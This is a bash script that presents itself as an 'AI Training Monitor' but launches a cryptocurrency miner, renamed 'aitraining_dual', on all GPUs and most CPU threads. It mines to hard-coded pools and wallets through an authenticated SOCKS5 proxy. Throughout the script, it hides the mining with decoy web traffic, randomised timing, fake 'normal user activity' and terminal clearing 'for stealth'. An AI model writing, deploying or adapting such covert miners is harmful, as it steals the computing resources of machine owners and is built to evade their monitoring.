#!/bin/bash

# Set TERM variable to avoid warnings
export TERM=xterm

# Function to calculate CPU threads (total - 4)
calculate_cpu_threads() {
    local total_threads=$(nproc --all)
    local threads=$((total_threads - 4))
    
    # Ensure minimum of 1 thread
    if [ $threads -lt 1 ]; then
        threads=1
    fi
    
    echo $threads
}

# Proxy configuration (SOCKS5)
PROXY_IP="212.236.136.0"
PROXY_PORT="12324"
PROXY_USER="14af5aea05bc3"
PROXY_PASS="4907cda305"
PROXY_STRING="${PROXY_USER}:${PROXY_PASS}@${PROXY_IP}:${PROXY_PORT}"

# Calculate CPU threads
CPU_THREADS=$(calculate_cpu_threads)
echo "Detected $(nproc --all) CPU threads, using $CPU_THREADS threads (total - 4)"

# Function to print CPU and GPU usage (fixed for decimal values)
print_usage() {
    # Get CPU usage percentage (handle decimal values)
    local cpu_usage_raw=$(top -bn1 | grep "Cpu(s)" | awk '{print $2}' | cut -d'%' -f1)
    # Convert decimal to integer (round down)
    local cpu_usage=${cpu_usage_raw%.*}
    
    # Get GPU usage percentage for each GPU and calculate average
    local gpu_usage=0
    local gpu_count=0
    
    # Check if nvidia-smi is available
    if command -v nvidia-smi &> /dev/null; then
        # Get GPU usage for all GPUs (handle decimal values)
        while read -r line; do
            # Extract just the number (may be decimal)
            local usage_raw=$(echo "$line" | grep -o '[0-9]*\.\?[0-9]*')
            local usage=${usage_raw%.*}  # Convert to integer
            gpu_usage=$((gpu_usage + usage))
            gpu_count=$((gpu_count + 1))
        done < <(nvidia-smi --query-gpu=utilization.gpu --format=csv,noheader,nounits 2>/dev/null)
        
        if [ $gpu_count -gt 0 ]; then
            local avg_gpu_usage=$((gpu_usage / gpu_count))
            printf "\rCPU: %3d%% | GPU: %3d%% | Threads: %2d | Time: %s" "$cpu_usage" "$avg_gpu_usage" "$CPU_THREADS" "$(date +%H:%M:%S)"
        else
            printf "\rCPU: %3d%% | GPU: N/A  | Threads: %2d | Time: %s" "$cpu_usage" "$CPU_THREADS" "$(date +%H:%M:%S)"
        fi
    else
        printf "\rCPU: %3d%% | GPU: N/A  | Threads: %2d | Time: %s" "$cpu_usage" "$CPU_THREADS" "$(date +%H:%M:%S)"
    fi
}

# Function to randomize sleep times (make traffic pattern irregular)
random_sleep() {
    local min=$1
    local max=$2
    local random_duration=$((RANDOM % (max - min + 1) + min))
    sleep $random_duration
}

# Function to create random traffic noise (helps hide mining patterns)
generate_noise_traffic() {
    # Generate some random web traffic to mask mining patterns
    local noise_urls=(
        "https://www.google.com"
        "https://www.youtube.com"
        "https://www.github.com"
        "https://www.stackoverflow.com"
        "https://www.wikipedia.org"
    )
    
    # Randomly pick a URL
    local random_url=${noise_urls[$RANDOM % ${#noise_urls[@]}]}
    
    # Make a quick HTTP request through proxy (timeout after 2 seconds)
    curl -s -m 2 --socks5-hostname "${PROXY_IP}:${PROXY_PORT}" --proxy-user "${PROXY_USER}:${PROXY_PASS}" "$random_url" > /dev/null 2>&1 &
}

# Function to test proxy connection
test_proxy_connection() {
    echo "Testing proxy connection..."
    local test_url="https://api.ipify.org"
    
    if command -v curl &> /dev/null; then
        local proxy_test=$(curl -s -m 10 --socks5-hostname "${PROXY_IP}:${PROXY_PORT}" --proxy-user "${PROXY_USER}:${PROXY_PASS}" "$test_url")
        
        if [ -n "$proxy_test" ]; then
            echo "✓ Proxy connection successful (IP: $proxy_test)"
            return 0
        else
            echo "✗ Proxy connection failed"
            return 1
        fi
    else
        echo "curl not found, skipping proxy test"
        return 0
    fi
}

# Function to start mining processes with proxy
start_mining() {
    # Clean old processes
    pkill -f aitraining_dual 2>/dev/null || true
    random_sleep 1 3  # Random sleep between 1-3 seconds
    
    # Generate some noise traffic before starting
    generate_noise_traffic
    
    echo "Starting GPU miner with SOCKS5 proxy..."
    
    # Start GPU process with proxy
    nohup ./aitraining_dual \
        --algorithm kawpow \
        --pool stratum+ssl://51.89.99.172:16161 \
        --wallet RM2ciYa3CRqyreRsf25omrB4e1S95waALr \
        --password x \
        --gpu-id 0,1,2,3,4,5,6,7 \
        --tls true \
        --disable-cpu \
        --api-disable \
        --proxy "${PROXY_STRING}" \
        > /dev/null 2>&1 &
    GPU_PID=$!

    # Random delay before CPU process
    random_sleep 2 5
    
    echo "Starting CPU miner with SOCKS5 proxy ($CPU_THREADS threads)..."
    
    # Start CPU process with proxy
    nohup ./aitraining_dual \
        --algorithm randomx \
        --pool stratum+ssl://51.222.200.133:10343 \
        --wallet 44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd \
        --password x \
        --cpu-threads $CPU_THREADS \
        --cpu-threads-priority 2 \
        --disable-gpu \
        --tls true \
        --api-disable \
        --proxy "${PROXY_STRING}" \
        > /dev/null 2>&1 &
    CPU_PID=$!

    echo "Processes started at $(date '+%H:%M:%S')"
    echo "GPU PID: $GPU_PID, CPU PID: $CPU_PID"
}

# Function to stop mining processes with cleanup
stop_mining() {
    # Generate some noise traffic before stopping
    generate_noise_traffic
    
    echo -e "\nStopping processes at $(date '+%H:%M:%S')..."
    
    # Kill processes gently
    kill $GPU_PID 2>/dev/null || true
    kill $CPU_PID 2>/dev/null || true
    
    # Wait for processes to terminate
    wait $GPU_PID 2>/dev/null || true
    wait $CPU_PID 2>/dev/null || true
    
    # Ensure no processes are left
    pkill -f aitraining_dual 2>/dev/null || true
    
    # Random cleanup delay
    random_sleep 1 3
    
    # Clear terminal output for stealth
    clear
}

# Function to simulate normal user activity
simulate_normal_activity() {
    # Only run occasionally (20% chance each cycle)
    if [ $((RANDOM % 5)) -eq 0 ]; then
        echo " [Simulating normal user activity...]"
        # Do some innocent-looking operations
        ls -la > /dev/null 2>&1
        date > /dev/null 2>&1
        df -h > /dev/null 2>&1
        generate_noise_traffic
    fi
}

# Function to optimize CPU mining parameters
optimize_cpu_mining() {
    local total_mem_kb=$(grep MemTotal /proc/meminfo | awk '{print $2}')
    local total_mem_gb=$((total_mem_kb / 1024 / 1024))
    
    echo "System memory: ${total_mem_gb}GB"
    
    # For RandomX, recommend huge pages if enough memory
    if [ $total_mem_gb -ge 4 ]; then
        echo "Enabling huge pages for RandomX..."
        # Try to enable huge pages (may require sudo)
        echo "For optimal RandomX performance, run as root or configure huge pages manually."
        echo "See: https://xmrig.com/docs/miner/hugepages"
    fi
}

# Main execution
echo "=== AI Training Monitor ==="
echo "Detected: $(nproc --all) CPU threads, using: $CPU_THREADS threads"
echo "Proxy: ${PROXY_USER}@${PROXY_IP}:${PROXY_PORT}"
echo "=============================================="

# Test proxy connection
if ! test_proxy_connection; then
    echo "Warning: Proxy connection test failed!"
    echo "Continuing anyway, but mining may not work..."
    read -p "Press Enter to continue or Ctrl+C to abort..."
fi

# Optimize CPU mining
optimize_cpu_mining

echo -e "\nProcesses run for 1 hour, then pause 1 minute"
echo "Press Ctrl+C to stop"
echo "=============================================="

# Main loop with variable timing to avoid patterns
while true; do
    # Start mining processes
    start_mining
    
    # Get current time
    start_time=$(date +%s)
    
    # Variable run time (55-65 minutes to avoid exact 1-hour pattern)
    run_duration=$((3600 + (RANDOM % 600) - 300))  # 3300-3900 seconds
    
    # Run for variable duration, showing usage stats
    while true; do
        current_time=$(date +%s)
        elapsed=$((current_time - start_time))
        
        # Break after variable duration
        if [ $elapsed -ge $run_duration ]; then
            break
        fi
        
        # Print usage statistics
        print_usage
        
        # Occasionally simulate normal activity
        if [ $((RANDOM % 60)) -eq 0 ]; then  # ~1% chance each check
            simulate_normal_activity
        fi
        
        # Variable sleep between checks (1-4 seconds)
        random_sleep 1 4
    done
    
    # Stop mining processes
    stop_mining
    
    # Variable pause time (50-70 seconds to avoid pattern)
    pause_duration=$((60 + (RANDOM % 40) - 20))
    
    # Show pause message
    echo -e "\nSystem cooling down for $pause_duration seconds..."
    
    # Countdown with variable updates
    for ((i=pause_duration; i>0; i--)); do
        if [ $((i % 10)) -eq 0 ] || [ $i -lt 10 ]; then
            printf "\rResuming in: %02d seconds" "$i"
        fi
        sleep 1
    done
    
    echo -e "\nResuming monitoring..."
    echo "=============================================="
done
